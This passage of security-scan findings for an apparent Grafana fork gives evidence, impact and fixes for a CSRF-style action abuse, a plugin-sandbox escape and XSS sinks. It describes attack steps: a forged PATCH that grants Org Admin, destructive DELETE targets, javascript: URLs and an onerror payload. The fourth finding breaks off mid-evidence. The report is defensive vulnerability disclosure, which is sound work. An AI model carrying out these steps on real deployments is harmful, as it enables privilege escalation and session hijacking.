**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256297

---

# Field actions forward stored unvalidated HTTP method (DELETE/PATCH) as authenticated same-origin request past POST/PUT allow-list

## Details
Panel field 'actions' (field config actions[], editable on table, canvas, timeseries, state-timeline, status-history, heatmap, xychart, candlestick, geomap and annotation markers) are dashboard-authored HTTP requests executed from the browser of whoever clicks them. getActions() in public/app/features/actions/utils.ts builds each request in processActionConfig()/buildActionRequest() and sends it with getBackendSrv().fetch(). The HTTP method is taken verbatim from the stored Action (config.method, line 208). The editor UI only offers POST and GET (httpMethodOptions in @grafana/data types/action.ts, recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map; ActionEditor.tsx:245-255), but the same file's HttpRequestMethod enum lists DELETE and PATCH, and the generated v2 dashboard schema (packages/grafana-schema/src/schema/dashboard/v2/types.spec.gen.ts in the same source map) types FetchOptions.method as 'GET' | 'PUT' | 'POST' | 'DELETE' | 'PATCH', so neither the frontend nor a schema-validating v2 save rejects these verbs. An Editor writes any verb into the dashboard JSON model (dashboard-scene/settings/JsonModelEditView.tsx) or the panel JSON (features/inspector/InspectJSONTab.tsx), both standard Editor features.

The request path makes the forged request authenticated: getUrl() turns a relative /api/... into an absolute URL on the Grafana origin (createAbsoluteUrl) and leaves absolute https://<grafana-host>/api/... URLs untouched; backendSrv's parseCredentials() defaults to 'same-origin', so the victim's grafana_session cookie is attached and the Origin header equals the host, which satisfies Grafana's CSRF middleware. Because the URL is absolute, isLocalUrl() is false and backendSrv neither renames an editor-supplied Authorization header nor adds X-Grafana-Org-Id. The body (config.body, default '{}') is sent for every non-GET method and patchHeaderParser supplies content-type: application/json for PATCH.

The project's only server-side control for action-originated same-origin writes is actions_allow_post_url, documented in conf/defaults.ini:569-571 and docs/sources/setup-grafana/configure-grafana/_index.md:828-840 as governing 'POST/PUT URL in actions' when X-Grafana-Action is present (default: refuse all same-origin POST/PUT). Assumption (no Go source in the checkout): the X-Grafana-Action middleware behaves as documented and does not inspect DELETE or PATCH; if it rejected every unsafe method this path would be blocked server-side.

Unlike the verified canvas Button variant (canvas-button-unvalidated-method-forced-authenticated-request, which left this sibling as a lead), this path is gated by PanelContext.canExecuteActions() = dashboard.canEditDashboard() (setDashboardPanelContext.ts:205-208; DashboardScene.tsx:1226-1231: !isSnapshot && !isEmbedded && (canEdit || canMakeEditable || viewersCanEdit); DashboardModel.ts:1188-1194) and the @grafana/ui ActionButton always shows a ConfirmModal whose body is action.confirmation, text the Editor writes. The gate therefore does not protect the highest-value victims: Org Admins and Server Admins can edit every dashboard, and co-Editors can edit shared folders. The request is blind (response discarded), so it is a write/forced-action primitive.

Attack: Editor adds a table cell action titled 'Acknowledge', confirmation text 'Acknowledge this row?', then edits the panel JSON to set fetch.method = 'PATCH', fetch.url = '/api/org/users/<editorUserId>', fetch.body = '{"role":"Admin"}'. An Org Admin opening the dashboard clicks the action button in the cell and confirms; their browser sends PATCH /api/org/users/<id> (api-merged.json updateOrgUserForCurrentOrg) with the Admin's cookie and the Editor becomes Org Admin. Other same-origin targets outside the POST/PUT rule include DELETE /api/admin/users/{id}, DELETE /api/datasources/uid/{uid}, DELETE /api/folders/{uid}, DELETE /api/dashboards/uid/{uid}, PATCH /api/serviceaccounts/{id}, DELETE /api/access-control/users/{userId}/roles/{roleUID}. Template variables (${__user.login}, ${__data.fields...}) are interpolated into URL, headers and body before new URL() so the editor can also target the clicking user's own id. The same unvalidated method is forwarded to the Infinity proxy variant (buildActionProxyRequest, url_options.method) when vizActionsAuth is enabled, but that request is server-side with datasource credentials and is not the subject here.

## Evidence
1. [public/app/features/actions/utils.ts:149–213](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/actions/utils.ts#L149-L213)
   processActionConfig()/buildActionRequest() read config.method straight from the stored field-config Action and copy it into BackendSrvRequest.method (line 208) without comparing it with the methods the editor offers; the body (config.body, default '{}') is sent for every non-GET method (line 156), editor-authored headers are forwarded verbatim (163-171, 196-198) and only X-Grafana-Action: 1 is added (204). A relative URL such as /api/org/users/7 is sanitizeUrl'd and made absolute on the Grafana origin by getUrl()/createAbsoluteUrl (227-236), and absolute URLs on the Grafana origin pass through new URL() untouched (155).
2. [public/app/features/actions/utils.ts:102–133](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/actions/utils.ts#L102-L133)
   ActionModel.onClick hands the built request to getBackendSrv().fetch() from the clicking user's browser; the response body is discarded and only a generic success/error toast is shown, so this is a blind forced-request primitive.
3. [public/app/features/actions/ActionEditor.tsx:245–254](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/actions/ActionEditor.tsx#L245-L254)
   The action editor restricts the method with RadioButtonGroup over httpMethodOptions (recovered @grafana/data types/action.ts: only POST and GET are offered), but the HttpRequestMethod enum in the same file already contains DELETE and PATCH and nothing at save or request-build time rejects them. An Editor edits the dashboard JSON model or panel JSON to store "method": "PATCH" or "DELETE" on a field's actions[].
4. [public/app/core/services/backend\_srv.ts:294–326](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/backend_srv.ts#L294-L326)
   Because getUrl() always yields an absolute URL, isLocalUrl() is false: backendSrv neither adds X-Grafana-Org-Id nor renames Authorization, and the editor's Authorization header (if any) reaches the Grafana API verbatim; parseInitFromOptions (core/utils/fetch.ts:194-209) uses credentials 'same-origin', so a request to the Grafana origin carries the victim's grafana_session cookie and an Origin header equal to the host, satisfying the CSRF middleware.
5. [public/app/core/utils/fetch.ts:41–59](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/fetch.ts#L41-L59)
   patchHeaderParser sets content-type: application/json for PATCH when none is configured, so a PATCH body such as {"role":"Admin"} is parsed as JSON by the server without any extra header; the default action config already carries Content-Type: application/json anyway (ActionEditor.tsx:46-52).
6. [public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts:205–207](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/setDashboardPanelContext.ts#L205-L207)
   canExecuteActions() is dashboard.canEditDashboard(): field actions are offered only to users who can edit the dashboard. This confines the victim set to co-Editors and Org/Server Admins (who can edit every dashboard) rather than Viewers, and is why this path is a distinct, higher-privilege-victim variant of the canvas Button finding.
7. [public/app/features/table/utils.ts:85–103](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/table/utils.ts#L85-L103)
   Shipped entry point: TableNG cells call getCellActions -> getActions for field.config.actions with visualizationType 'table'; sibling entry points are status-history/utils.ts getFieldActions (timeseries, heatmap, xychart, state-timeline tooltips, annotation markers) and canvas runtime/element.tsx getPrimaryAction/CanvasTooltip. All of them execute the request built here.
8. [conf/defaults.ini:569–570](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/conf/defaults.ini#L569-L570)
   The only server-side control for X-Grafana-Action requests is documented as 'Comma-separated list of paths for POST/PUT URL in actions. Empty will allow anything that is not on the same origin' (docs/sources/setup-grafana/configure-grafana/_index.md:828-840 likewise speaks of 'the POST verb' and 'authenticated POST requests to the local server'). DELETE and PATCH lie outside the documented rule; the Go middleware is absent from the checkout and its behaviour is this finding's stated assumption.

## Impact
One confirmed click by an Org Admin lets the Editor PATCH their own org role to Admin (full read/write over the organisation's dashboards, datasources, users, alerting: confidentiality and integrity), or DELETE users, datasources, folders, dashboards and role assignments with the victim's authority (integrity, availability). Impact stays within the Grafana instance.

## Reproduction steps
1. Attacker: authenticated Editor (threat-model adversary 3, 'forced requests via panel actions'). They store a field action whose method is DELETE/PATCH via the dashboard/panel JSON editor and point it at a same-origin /api path; all defaults suffice (actions_allow_post_url empty, no feature toggle needed, confirmation text attacker-written). Victim: an Org/Server Admin or co-Editor who can edit the dashboard (required by canExecuteActions) opens it, clicks the action and accepts the confirmation dialog - a conscious step, hence ACTIVE. No security mechanism must be defeated in the browser; the server-side X-Grafana-Action allow-list is assumed, per the shipped config comment and docs, to cover POST/PUT only.

## Recommended fix
1. processActionConfig()/buildActionRequest() forward config.method from stored dashboard JSON without validating it against the methods the feature supports, so DELETE/PATCH (or any verb) reach backendSrv.fetch and fall outside the server-side POST/PUT action allow-list. Fix criteria: At request-build time the method must be checked against an explicit allow-list matching what the editor offers (GET/POST/PUT) and any other stored value must abort the action rather than be sent; the same check must exist for the Infinity proxy variant. Verification: a field action whose JSON method is 'DELETE' or 'PATCH' produces no network request when clicked and confirmed.
2. Action requests to the Grafana origin carry the clicking user's session cookie and depend on a server-side allow-list that is method-specific, while the frontend gate (canExecuteActions) deliberately admits Admins, the most valuable victims. Fix criteria: Every non-safe method (anything other than GET/HEAD/OPTIONS) carrying X-Grafana-Action to a same-origin path must be refused unless the path is on actions_allow_post_url, or same-origin action requests must be sent without credentials. Verification: an Admin confirming an Editor-authored action cannot cause any state-changing authenticated request to the Grafana API outside the configured allow-list, for any HTTP verb.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-Site Request Forgery
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256247

---

# Frontend sandbox endows plugin code with the unmediated host Location; locationSandbox.assign('javascript:...') runs plugin code in the host realm

## Details
The Plugin Frontend Sandbox (docs/sources/administration/plugin-management/plugin-frontend-sandbox.md) promises that a sandboxed plugin cannot modify the Grafana interface outside its area, alter core features or global browser objects, or interfere with other plugins, and is recommended for 'Plugins from untrusted sources' and for panels that let users write custom JavaScript. Because window.location is unforgeable in the near-membrane red realm, sandboxPluginLoader.ts endows the sandbox with `locationSandbox: window.location` and codeLoader.ts rewrites `window.location` in plugin source to `window.locationSandbox`. The object handed over is the host document's real Location, wrapped by the membrane with no distortion.

Sandboxed plugin code can therefore run `locationSandbox.assign('javascript:<code>')` (or `.replace(...)`, or `locationSandbox.href = ...`). From the bundled @locker/near-membrane source recovered from public/build/pluginSandbox.*.js.map: the red proxy's get trap forwards to the blue Location and returns a proxy of the blue `assign`; the apply trap calls it with `this` unwrapped to the real window.location and the URL string passed as a primitive. The browser navigates the host document; a javascript: URL evaluates in the host realm, entirely outside the membrane. The plugin's code then runs with everything the sandbox was meant to withhold: it can rewrite any part of the Grafana UI (phish credentials on the datasource/login forms, hide or alter other panels), patch host globals such as fetch/XMLHttpRequest or the SystemJS module registry to intercept secrets admins type or view (datasource passwords, one-time API/service-account tokens), tamper with other plugins, and act with the victim's session. The same object also lets the plugin redirect the whole application off-site.

Preconditions: the plugin is listed in security.enable_frontend_sandbox_for_plugins (the sandbox is opt-in; only non-Grafana-signed plugins are eligible), and Content-Security-Policy is at its shipped default of off (conf/defaults.ini). The regex rewrite in patchPluginAPIs offers no containment. Dependency assumption: the @locker/near-membrane-base/-dom build bundled in public/build/pluginSandbox.*.js (version string not recoverable from this checkout) behaves as its shipped source shows - gets and applies on red proxies of blue objects are forwarded to the blue target, and a set on a non-live blue object goes static with membrane-wrapped accessors that still invoke the blue setter.

## Evidence
1. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:96–102](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L96-L102)
   Endowment `locationSandbox: window.location` hands the host document's own Location object to the red realm. near-membrane-dom's endowment filter (removeWindowDescriptors, recovered from public/build/pluginSandbox.*.js.map) strips only keys literally named document/location/top/window/chrome, so this key is installed on the red global as a plain membrane proxy of the blue Location; distortionCallback (lines 65-87) returns Location and its methods unchanged (not a DOM element, not in generalDistortionMap). This is the code the fix must change.
2. [public/app/features/plugins/sandbox/distortions.ts:72–88](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L72-L88)
   The complete list of static distortions. None is keyed on Location's own unforgeable members (assign, replace, href setter), so a red-realm `locationSandbox.assign(url)` is a plain get + apply: near-membrane forwards the call to the blue function with `this` unwrapped to the real window.location and the string argument passed as a primitive. The host document navigates; a javascript: URL evaluates in the host realm, outside the membrane.
3. [public/app/features/plugins/sandbox/codeLoader.ts:113–115](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/codeLoader.ts#L113-L115)
   patchPluginAPIs textually rewrites `window.location` to `window.locationSandbox`, so unmodified plugin builds transparently receive the host Location. It is a cosmetic regex; `locationSandbox`, `window['locationSandbox']` or any alias reaches the same object.
4. [public/app/features/plugins/sandbox/documentSandbox.ts:148–150](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/documentSandbox.ts#L148-L150)
   isLiveTarget is the membrane's liveTargetCallback. Location carries no SANDBOX_LIVE_VALUE mark, so a red `locationSandbox.href = ...` makes the proxy static: the shadow target receives copies of Location's own descriptors, including the `href` accessor whose setter is a membrane-wrapped blue function, and ReflectSet invokes that setter on the real Location. So `href =` navigates too; assign()/replace() need no mutation path at all.
5. [public/app/features/plugins/importer/importPluginModule.ts:66–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/importPluginModule.ts#L66-L72)
   Production dispatch: any plugin whose id is listed in security.enable_frontend_sandbox_for_plugins is loaded through importPluginModuleInSandbox, so every page that renders the plugin runs its code behind this endowment.
6. [public/app/features/plugins/sandbox/sandboxPluginLoaderRegistry.ts:58–71](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoaderRegistry.ts#L58-L71)
   Only plugins that are not Grafana-signed and not internal are sandbox-eligible, i.e. the sandbox is applied precisely to code the operator does not trust (community/unsigned plugins; panels that execute Editor-authored JavaScript).
7. [conf/defaults.ini:540–542](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/conf/defaults.ini#L540-L542)
   content_security_policy = false is the shipped default, so in the default deployment nothing blocks javascript: navigation of the host document; the sandbox documentation imposes no CSP obligation on operators who enable it.

## Impact
javascript: navigation yields arbitrary host-realm script in the victim's Grafana origin: read of config/boot data and any API response with the victim's session (confidentiality high), arbitrary modification of the Grafana UI, host globals and requests made as the victim, including credential capture on admin forms (integrity high); the plugin can also redirect or break the whole application for its viewers (availability low).

## Reproduction steps
1. The triggering input is plugin frontend code: authored by a third-party plugin developer (no privileges on the victim's Grafana; the operator installs the plugin and sandboxes it because it is untrusted) or by an Editor writing JavaScript into a sandboxed user-JS panel. It is delivered over the network to every user whose page renders the plugin (app plugins may preload on every page), and a single assign()/replace()/href assignment suffices with no defense to evade. The one deployment condition outside the attacker's control is that the plugin is listed in security.enable_frontend_sandbox_for_plugins - the sandbox is the vulnerable component and is opt-in; CSP off is the shipped default and so is not an additional requirement. The victim only views a page.

## Recommended fix
1. The host document's real Location object is handed to the red realm without mediation (via the locationSandbox endowment, and equally via any other alias of the blue Location the membrane may return, such as document.location), so sandboxed code can navigate the host document to javascript: or arbitrary URLs. Fix criteria: Sandboxed code receives only a mediated location facade: reads are permitted, but href/assign/replace (and every other navigating member reachable through a Location proxy) reject non-http(s) schemes - javascript:, data:, vbscript:, blob: - and preferably route through locationService. Verify from inside a sandboxed plugin that `locationSandbox.assign('javascript:...')`, `locationSandbox.replace(...)`, `locationSandbox.href = 'javascript:...'` and `document.location.assign('javascript:...')` neither execute code nor navigate, while same-origin http(s) navigation still works.
2. The distortion map keys only on DOM insertion and a handful of window members; Location's navigation members are not distorted, so the membrane forwards them untouched. Fix criteria: Register distortions (or a dedicated proxy) covering Location's own assign/replace/href accessors so the scheme check applies regardless of how plugin code obtains the Location object, with a regression test that a javascript: URL from the red realm is blocked and logged.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sandbox escape
**CWE:** [CWE-749](https://cwe.mitre.org/data/definitions/749.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256223

---

# Plugin catalog renders grafana.com README/changelog HTML unsanitized via dangerouslySetInnerHTML

## Details
The plugin catalog details page (`/plugins/:pluginId`, and `/connections/datasources/:id`, whose `DataSourceDetailsPage` mounts the same `PluginDetailsPage`) renders the plugin README and changelog as raw HTML. `getPluginDetails()` in `public/app/features/plugins/admin/api.ts` fetches `GET /api/gnet/plugins/:id` (`GCOM_API_ROOT = '/api/gnet'`, the Grafana server's reverse proxy to the host configured as `[grafana_com] api_url`, default `https://grafana.com/api`) and copies the pre-rendered `readme` and `changelog` fields of the `RemotePlugin` response into `CatalogPluginDetails` unchanged: line 51 `readme: localReadme || remote?.readme` (remote is used whenever the plugin is not installed or `/api/plugins/:id/markdown/README` returns nothing) and line 55 `changelog: remote?.changelog || localChangelog` (remote always preferred). `useGetSingle` -> `useFetchDetails` dispatches `fetchDetails` -> `getPluginDetails` as soon as the page mounts. `PluginDetailsBody.tsx` line 60 then writes `plugin.details?.readme` into `dangerouslySetInnerHTML` on the Overview tab, which `useDefaultPage` makes the default tab for every non-app plugin and for any user without `plugins:write`; `Changelog.tsx` line 15 does the same with the changelog string. No `textUtil.sanitize`, `sanitizeTextPanelContent` or `renderMarkdown` sits on this path; the `sanitizedHTML` prop name is not enforced by any caller.

The project does not treat this upstream as trusted HTML elsewhere: the local-markdown siblings (`getLocalPluginReadme`/`getLocalPluginChangelog`, lines 171-196) run through `renderMarkdown()`, which ends in `sanitizeTextPanelContent` (xss allow-list; recovered `packages/grafana-data/src/text/markdown.ts` and `sanitize.ts` in `public/build/6540.a30454ce5fbe65a84f5f.js.map`), and `statusContext` from the very same gcom response is sanitized through `renderMarkdown` in `PluginDetailsDeprecatedWarning.tsx` line 43. Only the two largest HTML blobs from grafana.com are exempt.

The recorded threat model lists plugin catalog metadata (grafana.com) among adversary-controlled upstream inputs. Whoever controls the body the configured gcom API host returns for `/api/plugins/<id>` — a compromise of grafana.com, or a plugin author if gcom's own README/changelog rendering lets markup through (not verifiable from this checkout) — gets script execution in the browser of any user who opens that plugin's details page; a tampered `[grafana_com] api_url` (deploy-time position) reaches the same sink. CSP is off by default and the default Trusted Types policy only strips `<script`, so `<img src=x onerror=...>` or `<svg onload=...>` runs with the victim's session. The `/plugins/:pluginId` route is gated to Admin/ServerAdmin or `plugins:install`/`plugins:write`, so the natural victim is an org or server admin: script in that session can call `POST /api/plugins/:id/install`, create users, change datasources, and read anything the admin can. The `/connections/*` route descriptor declares no `roles`, so the same unsanitized README is rendered for lower-privileged users who open `/connections/datasources/<pluginId>`.

Assumptions: (1) the Go `/api/gnet/*` handler is a plain reverse proxy that does not rewrite response bodies and requires only a signed-in user (no Go source in this checkout; the endpoint is absent from `public/api-merged.json`); (2) `@grafana/data` `renderMarkdown`/`sanitizeTextPanelContent` behave as recovered from the source map.

## Evidence
1. [public/app/features/plugins/admin/api.ts:47–64](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/admin/api.ts#L47-L64)
   getPluginDetails builds CatalogPluginDetails. Line 51 `readme: localReadme || remote?.readme` and line 55 `changelog: remote?.changelog || localChangelog` take the `readme`/`changelog` strings straight out of the `GET /api/gnet/plugins/:id` response (a reverse proxy to grafana.com). Only the *local* markdown paths (lines 171-196) run through `renderMarkdown`, which sanitizes; the remote strings are already HTML and receive no sanitization anywhere.
2. [public/app/features/plugins/admin/components/PluginDetailsBody.tsx:56–77](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/admin/components/PluginDetailsBody.tsx#L56-L77)
   Overview tab: `plugin.details?.readme` is written into the DOM with `dangerouslySetInnerHTML` with no sanitizer call. This is the default tab of the plugin details page.
3. [public/app/features/plugins/admin/components/PluginDetailsBody.tsx:88–89](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/admin/components/PluginDetailsBody.tsx#L88-L89)
   Changelog tab passes `plugin.details.changelog` (remote-preferred) to the Changelog component.
4. [public/app/features/plugins/admin/components/Changelog.tsx:10–18](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/admin/components/Changelog.tsx#L10-L18)
   The prop is named `sanitizedHTML` but the component (and every caller) performs no sanitization; the string goes directly into `dangerouslySetInnerHTML`.
5. [public/app/features/plugins/admin/api.ts:171–195](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/admin/api.ts#L171-L195)
   Sibling path for locally installed plugins: `/api/plugins/:id/markdown/README|CHANGELOG` output is passed through `renderMarkdown()` (sanitizeTextPanelContent, xss allow-list per the recovered packages/grafana-data/src/text/markdown.ts in public/build/6540.a30454ce5fbe65a84f5f.js.map). The remote path has no equivalent, showing the omission is specific to grafana.com-sourced HTML.
6. [public/app/features/connections/routes.tsx:6–14](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/connections/routes.tsx#L6-L14)
   The `/connections/*` route descriptor declares no `roles`; `Connections.tsx` routes `/connections/datasources/:id` to `DataSourceDetailsPage`, which mounts the same `PluginDetailsPage` (and thus `PluginDetailsBody`), so the unsanitized gcom README is rendered for any signed-in user who opens that URL, not only the Admin-gated `/plugins/:pluginId` route (assuming the backend `/api/gnet/*` proxy requires only a signed-in user).

## Impact
Script executes in the admin's authenticated origin: full read of anything the admin can see (datasource configs, users, API keys shown in UI) and full write (install/uninstall plugins, create admin users, modify datasources). Availability impact is incidental.

## Reproduction steps
1. Attacker must control the HTML returned for `/api/plugins/<id>` by the configured grafana.com API host (compromised gcom, README HTML that survives gcom rendering, altered `[grafana_com] api_url`, or on-path position toward gcom). No Grafana credentials are required of the attacker. The victim — typically an org/server admin — only has to open the plugin's details page (Overview is the default tab; `/connections/datasources/:id` reaches the same component for any authenticated user). No CSP by default; TT policy only strips `<script`, so event-handler payloads run unimpeded.

## Recommended fix
`getPluginDetails()` treats `remote.readme` and `remote.changelog` (HTML from the grafana.com proxy) as trusted and stores them verbatim, while the equivalent local-markdown path is sanitized; the catalog UI then injects the strings with `dangerouslySetInnerHTML`. Fix criteria: All HTML that originates from the gcom proxy and is rendered via innerHTML (readme, changelog, and any future field) is passed through the project's HTML sanitizer (`textUtil.sanitize`/`sanitizeTextPanelContent`) before reaching the DOM, on both the remote and local branches. Verification: a gcom response whose `readme` or `changelog` contains `<img src=x onerror=alert(1)>` renders without executing script on both the /plugins/:id and /connections/datasources/:id pages, and the Changelog component's `sanitizedHTML` contract is enforced at the boundary rather than assumed.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256219

---

# Extension link path accepted without scheme validation; host window.open sinks execute a sandboxed plugin's javascript: path in the Grafana origin

## Details
App plugins register link extensions (plugin.json extensions.addedLinks / AppPlugin.addLink) that core Grafana renders and navigates to in its own UI. AddedLinksRegistry.mapToRegistry accepts any string for `path` (only title, configure-is-function and path||onClick are checked), getLinkExtensionOverrides lets the plugin's configure() callback replace `path` at render time, and addedLinkToExtensionLink forwards it after appending tracking params by string concatenation. A path such as `javascript:<code>//` therefore reaches core consumers as `javascript:<code>//?uel_pid=<id>&uel_epid=<point>`.

Where the consumer is a React-rendered anchor (panel menu `href: extension.path`, NavLandingPage `url={link.path}`, EditDataSourceActions Menu.Item, command-palette KBarResults href, log attribute links) the shipped React 19.2.8 rewrites javascript: hrefs to a throwing stub (the block string is present in public/build/7606.*.js), so those sinks are plugin-controlled navigation but not script execution. Two core consumers bypass React: ConfirmNavigationModal.tsx:17 (Explore toolbar, reached through ToolbarExtensionPointMenu for any plugin link at grafana/explore/toolbar/action; 'Open in new tab' calls global.open(locationUtil.assureBaseUrl(path), '_blank'), and assureBaseUrl returns non-'/'-prefixed strings unchanged) and TracePageHeader.tsx:241 (window.open(link.path, '_blank') for any plugin link at grafana/traceview/header/actions). window.open of a javascript: URL evaluates the code in a new about:blank window that inherits the Grafana origin and holds a live `opener` onto the authenticated Grafana document.

Security consequence: when the registering plugin runs inside the Plugin Frontend Sandbox (operator opt-in via enable_frontend_sandbox_for_plugins; docs/sources/administration/plugin-management/plugin-frontend-sandbox.md recommends it for 'plugins from untrusted sources' and promises that core Grafana and global browser objects are protected from the plugin), this is a sandbox escape: sandboxComponents.tsx wraps only components, pluginImporter.ts:106 registers addedLinkConfigs into the host registry unchanged, and the host itself performs the window.open in the blue realm, so the plugin's code runs with full access to the host document, grafanaBootData, cookies and session-authenticated fetch. For a non-sandboxed plugin the path adds nothing (its module already runs in the page), so the finding is scoped to the sandbox boundary. The default configuration applies: content_security_policy = false (the shipped CSP template would block javascript: URLs).

Related but distinct: the verified record explore-toolbar-extension-window-open-tabnabbing covers the missing noopener at the same window.open (attacker = external destination host). The lead lead-distortions-72-e6bb notes window.open is not distorted by the membrane either; that is a separate sandbox weakness, not a sanctioned concession, and does not change that host code here opens an unvalidated plugin URL.

Assumptions about uninstalled packages: @grafana/data locationUtil.assureBaseUrl and urlUtil.appendQueryToUrl behave as the shipped source map (public/build/6540.a30454ce5fbe65a84f5f.js.map) shows; react-dom 19.2.8 blocks javascript: in attributes it renders (string present in the build).

## Evidence
1. [public/app/features/plugins/extensions/registry/AddedLinksRegistry.ts:45–93](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/registry/AddedLinksRegistry.ts#L45-L93)
   mapToRegistry validates only that title exists, configure is a function and path||onClick is present (56-69); `path` is spread verbatim into the registry item (83-92). No scheme, origin or /a/<pluginId> prefix check exists here or in validators.ts.
2. [public/app/features/plugins/extensions/utils.tsx:416–478](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/utils.tsx#L416-L478)
   getLinkExtensionOverrides lets the plugin's configure() callback replace `path` at render time with any string (434, 460); assertStringProps covers only title/description (447).
3. [public/app/features/plugins/extensions/utils.tsx:553–593](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/utils.tsx#L553-L593)
   addedLinkToExtensionLink keeps the plugin path when isString (588) and getLinkExtensionPathWithTracking appends `?uel_pid=..&uel_epid=..` by plain string concatenation (urlUtil.appendQueryToUrl, grafana-data utils/url.ts:110-124 in the shipped source map), so `javascript:<code>//` survives as `javascript:<code>//?uel_pid=...` with the suffix commented out.
4. [public/app/features/explore/extensions/ConfirmNavigationModal.tsx:14–20](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/extensions/ConfirmNavigationModal.tsx#L14-L20)
   Non-React sink: 'Open in new tab' calls global.open(locationUtil.assureBaseUrl(path), '_blank'). assureBaseUrl (grafana-data utils/location.ts:61-66 in the source map) returns any string not starting with '/' unchanged, so a javascript: URL is handed to window.open and evaluated in a new same-origin window with a live opener onto the authenticated Grafana document.
